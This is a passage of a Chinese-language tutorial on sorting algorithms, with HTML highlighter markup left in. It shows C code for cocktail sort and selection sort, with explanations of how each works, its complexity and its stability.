id=\"crayon-5b4ad567a1b66676694737-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-16\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-18\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CocktailSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-19\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                            </span><span class=\"crayon-c\">// 初始化边界</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">   </span><span class=\"crayon-c\">// 前半轮,将最大元素放到后面</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-26\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-27\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-28\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-29\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">right</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-32\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">   </span><span class=\"crayon-c\">// 后半轮,将最小元素放到前面</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-33\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-34\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-35\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-36\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-37\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-39\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">left</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-40\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-41\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-42\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-43\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-44\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-45\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">   </span><span class=\"crayon-c\">// 从小到大定向冒泡排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-47\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">CocktailSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-48\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"鸡尾酒排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-50\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-51\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-52\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-53\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-54\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-55\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.3353 seconds] -->\r\n<p>使用鸡尾酒排序为一列数字进行排序的过程如右图所示：</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fr773kzmggg207p075tbu.gif\" width=\"277\" height=\"257\"></p>\n<p>以序列(2,3,4,5,1)为例，鸡尾酒排序只需要访问一次序列就可以完成排序，但如果使用冒泡排序则需要四次。但是在乱数序列的状态下，鸡尾酒排序与冒泡排序的效率都很差劲。</p>\n<p><strong>　　</strong></p>\n<h2>选择排序(Selection Sort)</h2>\n<p>选择排序也是一种简单直观的排序算法。它的工作原理很容易理解：初始时在序列中找到最小（大）元素，放到序列的起始位置作为已排序序列；然后，再从剩余未排序元素中继续寻找最小（大）元素，放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p>\n<p>注意选择排序与冒泡排序的区别：冒泡排序通过依次交换相邻两个顺序不合法的元素位置，从而将当前最小（大）元素放到合适的位置；而选择排序每遍历一次都记住了当前最小（大）元素的位置，最后仅需一次交换操作即可将其放到合适的位置。</p>\n<p>选择排序的代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ad567a1b6c519336991\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;stdio.h&gt;\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(n^2)\r\n// 最优时间复杂度 ---- O(n^2)\r\n// 平均时间复杂度 ---- O(n^2)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 不稳定\r\n\r\nvoid Swap(int A[], int i, int j)\r\n{\r\n    int temp = A[i];\r\n    A[i] = A[j];\r\n    A[j] = temp;\r\n}\r\n\r\nvoid SelectionSort(int A[], int n)\r\n{\r\n    for (int i = 0; i &lt; n - 1; i++)         // i为已排序序列的末尾\r\n    {\r\n        int min = i;\r\n        for (int j = i + 1; j &lt; n; j++)     // 未排序序列\r\n        {\r\n            if (A[j] &lt; A[min])              // 找出未排序序列中的最小值\r\n            {\r\n                min = j;\r\n            }\r\n        }\r\n        if (min != i)\r\n        {\r\n            Swap(A, min, i);    // 放到已排序序列的末尾，该操作很有可能把稳定性打乱，所以选择排序是不稳定的排序算法\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 8, 5, 2, 6, 9, 3, 1, 4, 0, 7 }; // 从小到大选择排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    SelectionSort(A, n);\r\n    printf(\"选择排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b6c519336991-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b6c519336991-49\">49</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-1\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-3\"><span class=\"crayon-c\">// 分类 -------------- 内部比较排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-4\"><span class=\"crayon-c\">// 数据结构 ---------- 数组</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-5\"><span class=\"crayon-c\">// 最差时间复杂度 ---- O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-6\"><span class=\"crayon-c\">// 最优时间复杂度 ---- O(n^2)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-7\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-8\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(1)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-9\"><span class=\"crayon-c\">// 稳定性 ------------ 不稳定</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-11\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-12\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-16\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b6c519336991-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b6c519336991-18\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SelectionSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span 